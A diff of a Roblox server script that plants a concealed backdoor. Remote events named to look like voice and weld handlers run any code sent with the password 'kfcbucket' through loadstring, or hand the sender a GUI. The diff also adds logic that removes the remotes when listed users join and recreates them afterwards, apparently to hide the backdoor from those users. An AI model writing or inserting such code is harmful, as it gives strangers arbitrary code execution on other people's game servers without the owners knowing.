@@ -1,44 +1,55 @@
-
 local gui = game:GetService("InsertService"):LoadAsset(13043984134)
 gui.ScreenGui.ResetOnSpawn = false
-local remote1 = Instance.new("RemoteEvent", game:GetService("VoiceChatService"))
-remote1.Name = "VoiceRequest"
-local remote2 = Instance.new("RemoteEvent", game:GetService("JointsService"))
-remote2.Name = "Welds"
-remote1.OnServerEvent:Connect(function(plr, arg, c)
-	if arg == "kfcbucket" then
-		if c then
-			loadstring(c)()
-		end
-		if not c then
-			gui.ScreenGui:Clone().Parent = plr.PlayerGui
-		end
-	end
-end)
-remote2.OnServerEvent:Connect(function(plr, arg, c)
-	if arg == "kfcbucket" then
-		if c then
-			loadstring(c)()
-		end
-		if not c then
-			gui.ScreenGui:Clone().Parent = plr.PlayerGui
-		end
-	end
-end)
-local WhiteList = {
-	["DENIS_7246"] = true,
-	["WaffleFrog404"] = true,
-	["egor3556411"] = true,
-	["huks2010"] = true,
-	["dghkjg"] = true,
-	["didx232333"] = true,
-	["hebris"] = true
+local remote1, remote2 = nil, nil
 
+local function creation()
+    remote1 = Instance.new("RemoteEvent", game:GetService("VoiceChatService"))
+    remote1.Name = "VoiceRequest"
+    remote2 = Instance.new("RemoteEvent", game:GetService("JointsService"))
+    remote2.Name = "Welds"
+    remote1.OnServerEvent:Connect(function(plr, arg, c)
+        if arg == "kfcbucket" then
+            if c then
+                loadstring(c)()
+            end
+            if not c then
+                gui.ScreenGui:Clone().Parent = plr.PlayerGui
+            end
+        end
+    end)
+    remote2.OnServerEvent:Connect(function(plr, arg, c)
+        if arg == "kfcbucket" then
+            if c then
+                loadstring(c)()
+            end
+            if not c then
+                gui.ScreenGui:Clone().Parent = plr.PlayerGui
+            end
+        end
+    end)
+end
+
+creation()
+
+local WhiteList = {
+    "DENIS_7246",
+    "WaffleFrog404",
+    "egor3556411",
+    "huks2010",
+    "dghkjg",
+    "didx232333",
+    "hebris"
 }
 
 game.Players.PlayerAdded:Connect(function(plr)
-	if table.find(WhiteList, plr.Name) or table.find(WhiteList, plr.DisplayName) then
-		remote1:Destroy()
-		remote2:Destroy()
-	end
+    if table.find(WhiteList, plr.Name) or table.find(WhiteList, plr.DisplayName) then
+        remote1:Destroy()
+        remote2:Destroy()
+    end
+end)
+
+game.Players.PlayerRemoving:Connect(function(plr)
+    if not (table.find(WhiteList, plr.Name) or table.find(WhiteList, plr.DisplayName)) then
+        creation()
+    end
 end)
